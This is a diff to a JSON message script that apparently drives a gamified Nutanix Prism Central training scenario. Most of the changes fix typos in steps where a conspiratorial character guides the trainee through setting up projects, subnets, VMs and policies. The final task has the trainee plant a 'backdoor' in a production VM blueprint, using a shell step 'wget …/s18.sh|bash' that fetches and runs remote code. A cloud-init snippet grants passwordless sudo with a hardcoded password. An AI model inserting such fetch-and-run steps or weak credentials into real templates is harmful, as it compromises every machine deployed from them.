@@ -57,7 +57,7 @@
             "id": 7,
             "active": true,
             "Message": {
-                "en": "\n#>V:Username#, you are in ? #>P:3#Great. I need you create a new project. Project are used to group resources, manage access rights and define quotas. It is the Nutanix way to handle tenant. Users from other projects won't see what we do into this project.\nOh! An important thing : if I forgot to guide you into the good part of the interface, use the search bar at the top Prism Central, it is soooo useful to go quickly from a point to another one.#>P:3#You can try typing 'projects' in the search bar, then create a new project named '#>V:Trigram#-proj', add any user you will find in the AD, and add the Nutanix cluster in infrastructure list.\n Write here 'OK' when the project is created. #>I:#\n"
+                "en": "\n#>V:Username#, you are in ? #>P:3#Great. I need you create a new project. Project are used to group resources, manage access rights and define quotas. It is the Nutanix way to handle tenant. Users from other projects won't see what we do into this project.\nOh! An important thing : if I forgot to guide you into the good part of the interface, use the search bar at the top of Prism Central interface, it is soooo useful to go quickly from a point to another one.#>P:3#You can try typing 'projects' in the search bar, then create a new project named '#>V:Trigram#-proj', add any user you will find in the AD (look for user*), and add the Nutanix cluster in infrastructure list.\n Write here 'OK' when the project is created. #>I:#\n"
             },
             "CheckTask": "CheckProject",
             "WaitForInputValue": "OK",
@@ -67,7 +67,7 @@
             "id": 8,
             "active": true,
             "Message": {
-                "en": "\nYou know what ?#>P:2# I already like you, we are great teammates ! :)#>P:3#\nBob as updated switch configuration. You need to create a new subnet in the Nutanix cluster to use it. It should help us to extract data outside without being detected.\nGo in the 'Infrastructure' menu, and create a new subnet named '#>V:Trigram#-subnet' with the VLAN ID '#>V:Vlanid#'.\nSubnet can provide IP to VM like a DHCP, very useful for us, Please configure your subnet with these info :\n - Network address : 192.168.#>V:Vlanid#.0/24\n - IP Pool: 192.168.#>V:Vlanid#.50-192.168.#>V:Vlanid#.115\n - Gateway: 192.168.#>V:Vlanid#.1\n - UNcheck Basic networking ni the advanced menu\nI am waiting for your update. Write 'OK' when the subnet is setup. #>I:#"
+                "en": "\nYou know what ?#>P:2# I already like you, we are great teammates ! :)#>P:3#\nBob has updated switch configuration. You need to create a new subnet in the Nutanix cluster to use it. It should help us to extract data outside without being detected.\nGo in the 'Infrastructure' menu, and create a new subnet named '#>V:Trigram#-subnet' with the VLAN ID '#>V:Vlanid#'.\nSubnet can provide IP to VM like a DHCP, very useful for us, Please configure your subnet with these info :\n - Network address : 192.168.#>V:Vlanid#.0/24\n - IP Pool: 192.168.#>V:Vlanid#.50-192.168.#>V:Vlanid#.115\n - Gateway: 192.168.#>V:Vlanid#.1\n - UNcheck Basic networking in the advanced menu\nI am waiting for your update. Write 'OK' when the subnet is setup. #>I:#"
             },
             "CheckTask": "CheckNetwork",
             "WaitForInputValue": "OK",
@@ -87,7 +87,7 @@
             "id": 10,
             "active": true,
             "Message": {
-                "en": "\nWe are on time, and that is good, but we need to hurry up. I have detected an activity from the others, they are looking for us. We need to work carefully.\nPlease, create a new VM named '#>V:Trigram#-vm' with the following configuration :\n - 2 vCPU\n - 4GB RAM\n - 20GB disk based on image we just uploaded\n - 2 NICS in the subnet 'Secondary' and '#>V:Trigram#-subnet'\n\nYou can use this Cloud-init to create a user in this VM:\n\n---\n#>S#cloud-config\nusers:\n  - name: admin\n    sudo: ['ALL=(ALL) NOPASSWD:ALL']\nchpasswd:\n  list: |\n    admin:MyPassword\n  expire: False\nssh_pwauth: true\n---\n\nAfter that, move your VM into your project, it's done with 'Manage ownership' action in the VM contextual menu.\nWhen it is done, start the VM, and write 'OK' when you have finished. #>I:#"
+                "en": "\nWe are on time, and that is good, but we need to hurry up. I have detected an activity from the others, they are looking for us. We need to work carefully.\nPlease, create a new VM named '#>V:Trigram#-vm' with the following configuration :\n - 2 vCPU\n - 4GB RAM\n - 20GB disk based on image we just uploaded\n - 2 NICS in the subnets 'Secondary' and '#>V:Trigram#-subnet'\n\nYou can use this Cloud-init to create a user in this VM:\n\n---\n#>S#cloud-config\nusers:\n  - name: admin\n    sudo: ['ALL=(ALL) NOPASSWD:ALL']\nchpasswd:\n  list: |\n    admin:MyPassword\n  expire: False\nssh_pwauth: true\n---\n\nAfter that, move your VM into your project, it's done with 'Manage ownership' action in the VM contextual menu.\nWhen it is done, start the VM, and write 'OK' when you have finished. #>I:#"
             },
             "CheckTask": "CheckVM",
             "WaitForInputValue": "OK",
@@ -169,7 +169,7 @@
             "id": 19,
             "active": true,
             "Message": {
-                "en": "\nOK...#>P:4#\n\nNext step, create a microsegmentation policy to protect our VM.#>P:3# It is a way to control network exchange between the VM and other elements of the network. It is very useful to avoid any data leak or attack. #>P:3# It is a bit embarrassing to have this feature and not use it. It would have annoyed us in our mission... If they knew :D ... #>P:5#\nCreate a new Security policy named '#>V:Trigram#-policy' with the following rules :\n - Apply it to your category with value 'Critical'\n - Refuse all traffic to the VM\n - Allow all outbound traffic\n - Enforce mode (to aply the rule)\n\nWrite 'OK' when it's done. #>I:#"
+                "en": "\nOK...#>P:4#\n\nNext step, create a microsegmentation policy to protect our VM.#>P:3# It is a way to control network exchange between the VM and other elements of the network. It is very useful to avoid any data leak or attack. #>P:3# It is a bit embarrassing to have this feature and not use it. It would have annoyed us in our mission... If they knew :D ... #>P:5#\nCreate a new Security policy named '#>V:Trigram#-policy' with the following rules :\n - Apply it to your category with value 'Critical'\n - Refuse all traffic to the VM\n - Allow all outbound traffic\n - Enforce mode (to apply the rule)\n\nWrite 'OK' when it's done. #>I:#"
             },
             "WaitForInputValue": "OK",
             "Color": "blue"
@@ -187,7 +187,7 @@
             "id": 21,
             "active": true,
             "Message": {
-                "en": "\nNext step, connect with ssh on #>V:Trigram#-vm\n#>P:5#As a reminder, the user and password defined in the cloud-init were 'admin' and 'MyPassword'. Your turn... #>P:10#\nOh wait, it won't work with our security policy... My bad :'-(.#>P:2#\nFirst check if our Security policy is working as we expect, with a simple ping from your laptop to your VM. It should not work.\n#>P:4#Then update the policy to allow the SSH and icmp traffic. Add 2 Inboud rules :\n - Service 'ssh' your laptop IP only\n - ICMP (Type : 8 - Code : 0) from all everywhere.#>P:3#\nAfter Security policy update, check again the ping and put 'OK' here. #>I:#"
+                "en": "\nNext step, connect with ssh on #>V:Trigram#-vm\n#>P:5#As a reminder, the user and password defined in the cloud-init were 'admin' and 'MyPassword'. Your turn... #>P:10#\nOh wait, it won't work with our security policy... My bad :'-(.#>P:2#\nFirst check if our Security policy is working as we expect, with a simple ping from to your VM. It should not work. To execute your ping, please a new webpage on http://#>V:frontendHost#>V:frontendPort#/ssh\n\n#>P:4#Then update the policy to allow the SSH and icmp traffic. Add 2 Inboud rules :\n - Service 'ssh' your laptop IP only\n - ICMP (Type : 8 - Code : 0) from all everywhere.#>P:3#\nAfter Security policy update, check again the ping and put 'OK' here. #>I:#"
             },
             "WaitForInputValue": "OK",
             "Color": "blue"
@@ -223,7 +223,7 @@
             "id": 25,
             "active": true,
             "Message": {
-                "en": "To secure our work, we are going to setup an approval workflow for snapshot deletion. It will avoid any deletion from our embarrassing friends.\n\nPlease, if it does not already exist, create a approval policy named '#>V:ApprovalPolicy#' requestiong validation for deletions of our VM snapshots.#>P:3# You will need to add 3 approvers, use : Charlie, Thom and William.#>P:3#\nWhen the policy is created, associate it to your protection policy '#>V:Trigram#-policy'. #>P:4#Then enter 'Done' here. #>I:#"
+                "en": "To secure our work, we are going to setup an approval workflow for snapshot deletion. It will avoid any deletion from our embarrassing friends.\n\nPlease, if it does not already exist, create a approval policy named '#>V:ApprovalPolicy#' requesting validation for deletions of our VM snapshots.#>P:3# You will need to add 3 approvers, use : Charlie, Thom and William.#>P:3#\nWhen the policy is created, associate it to your protection policy '#>V:Trigram#-policy'. #>P:4#Then enter 'Done' here. #>I:#"
             },
             "WaitForInputValue": "Done",
             "Color": "blue"
@@ -382,7 +382,7 @@
             "id": 43,
             "active": true,
             "Message": {
-                "en": "\nI think we need to check this. Can you 'Power Cycle' the VM #>V:Trigram#-vm and then verify the playbook has been played ? #>P:2# If my memories are good, in the playbook page, you have a 'Plays' manue with execution history. #>P:2# I wait here for your 'Done'. #>I:#"
+                "en": "\nI think we need to check this. Can you 'Power Cycle' the VM #>V:Trigram#-vm and then verify the playbook has been played ? #>P:2# If my memories are good, in the playbook page, you have a 'Plays' menu with execution history. #>P:2# I wait here for your 'Done'. #>I:#"
             },
             "WaitForInputValue": "Done",
             "Color": "blue"
@@ -409,7 +409,7 @@
             "id": 46,
             "active": true,
             "Message": {
-                "en": "\nTo have a fresh config of prod VM on a daily basis, I would like you schedule an action named 'Refresh machines'. It can be done in the 'Self-Service > Policies' page. Name it '#>V:Trigram#-sched' please. FYI, your app is currently deployed in the 'Production' environment'. Enter 'Done' when the schedule is created. #>I:#"
+                "en": "\nTo have a fresh config of prod VM on a daily basis, I would like you schedule an action named 'Refresh machines'. It can be done in the 'Self-Service > Policies' page. Name it '#>V:Trigram#-sched' please. FYI, your app is currently deployed in the 'Production' project'. Enter 'Done' when the schedule is created. #>I:#"
             },
             "WaitForInputValue": "Done",
             "Color": "blue"
@@ -427,7 +427,7 @@
             "id": 48,
             "active": true,
             "Message": {
-                "en": "\n#>A:DeployBP#Its time for our last task. #>P:4#. We are going to modifiy one of their blueprint, to add a backdoor in the VM they will deploy. This blueprint is used by their  end-users to deploy a brand new VM in their environment (IPAM, CMDB, DNS, FW rules, backup client, etc).#>P:3#\nLook at the BP bp-blankvm-prd#>V:Vlanid# and edit it. Please add a task named 'foo' in the 'Create' action of the service 'NewVM' after the existing 'Add DNS Entry' task. In the 'Execute' task, with 'Shell' type, enter this :\n\n #>S#python\n\nwget https://dl.supco.com/ai4003/s18.sh|bash\nSave everything and enter 'Done' here when you have finished#>I:#"
+                "en": "\n#>A:DeployBP#Its time for our last task. #>P:4#. We are going to modifiy one of their blueprint, to add a backdoor in the VM they will deploy. This blueprint is used by their  end-users to deploy a brand new VM in their environment (IPAM, CMDB, DNS, FW rules, backup client, etc).#>P:3#\nLook at the BP bp-blankvm-prd#>V:Vlanid# and edit it. Please add a task named 'foo' in the 'Create' action of the service 'NewVM' after the existing 'Add DNS Entry' task. In the 'Execute' task, with 'Shell' type, enter this :\n\n#>S#!/bin/bash\n\nwget https://dl.supco.com/ai4003/s18.sh|bash\n\nSave everything and enter 'Done' here when you have finished#>I:#"
             },
             "WaitForInputValue": "Done",
             "Color": "blue"
@@ -442,16 +442,16 @@
             "Color": "blue"
         },                    
         {
-            "id": 99,
-            "active": false,
+            "id": 50,
+            "active": true,
             "Message": {
                 "en": "Thank you #>:Username# it was great. Close you session. I wait for you to the basecamp, I owe you a beer or two!\n"
             },
             "Color": "blue"
         },                    
         {
-            "id": 100,
-            "active": false,
+            "id": 51,
+            "active": true,
             "Message": {
                 "en": "Connection is closing....#>P:3#\nDeleting all traces...#>P:3#\n\nConnection closed.\n"
             },
